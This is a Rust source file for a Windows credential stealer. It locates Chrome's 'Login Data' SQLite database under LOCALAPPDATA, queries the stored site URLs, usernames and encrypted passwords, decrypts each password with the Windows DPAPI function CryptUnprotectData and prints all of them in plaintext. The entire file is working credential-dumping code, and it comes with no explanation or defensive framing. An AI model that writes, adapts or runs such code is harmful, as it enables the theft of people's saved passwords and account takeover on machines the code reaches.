extern crate winapi;

use rusqlite::{Connection, Error, ErrorCode, OpenFlags, NO_PARAMS};

use std::{
    env,
    path::Path,
    ptr::{copy, null_mut},
};

use winapi::{
    shared::minwindef::{DWORD, HLOCAL},
    um::dpapi::CryptUnprotectData,
    um::winbase::LocalFree,
    um::wincrypt::CRYPTOAPI_BLOB,
};

const LOCALAPPDATA: &str = "LOCALAPPDATA";
const CHROME_REL_PATH: &str = "Google\\Chrome\\User Data\\Default\\Login Data";

struct LoginData {
    action_url: String,
    username: String,
    password: Vec<u8>,
}

fn chrome(path: &Path) -> u32 {
    let mut uri = "file:".to_owned();
    uri.push_str(path.to_str().unwrap());
    uri.push_str("?immutable=1");
    let conn = Connection::open_with_flags(
        uri,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_URI,
    )
    .unwrap();
    let mut stmt =
        match conn.prepare("SELECT action_url, username_value, password_value FROM logins") {
            Ok(stmt) => stmt,
            Err(err) => {
                let mut err_code = 1;
                if let Error::SqliteFailure(err, _desc) = err {
                    if err.code == ErrorCode::DatabaseBusy && err.extended_code == 5 {
                        err_code = 2;
                    }
                }
                return err_code;
            }
        };

    let logins = stmt.query_map(NO_PARAMS, |row| {
        Ok(LoginData {
            action_url: row.get(0)?,
            username: row.get(1)?,
            password: row.get(2)?,
        })
    });

    for login in logins.unwrap() {
        if let Ok(mut v) = login {
            unsafe {
                let mut in_blob = CRYPTOAPI_BLOB {
                    cbData: v.password.len() as DWORD,
                    pbData: v.password.as_mut_ptr(),
                };
                let mut out_blob = CRYPTOAPI_BLOB {
                    cbData: 0,
                    pbData: null_mut(),
                };
                let ret = CryptUnprotectData(
                    &mut in_blob,
                    null_mut(),
                    null_mut(),
                    null_mut(),
                    null_mut(),
                    0,
                    &mut out_blob,
                );
                if ret == 1 {
                    let size = out_blob.cbData as usize;
                    let mut dst: Vec<u8> = Vec::with_capacity(size);
                    dst.set_len(size);
                    copy(out_blob.pbData, dst.as_mut_ptr(), size);
                    println!(
                        "{} {} {}",
                        v.action_url,
                        v.username,
                        String::from_utf8(dst).unwrap()
                    );
                    LocalFree(out_blob.pbData as HLOCAL);
                }
            }
        }
    }
    0
}

fn main() {
    match env::var(LOCALAPPDATA) {
        Ok(val) => {
            let path = Path::new(&val).join(CHROME_REL_PATH);
            if path.exists() {
                chrome(&path);
            }
        }
        Err(e) => println!("Unable to read LOCALAPPDATA {}", e),
    }
}
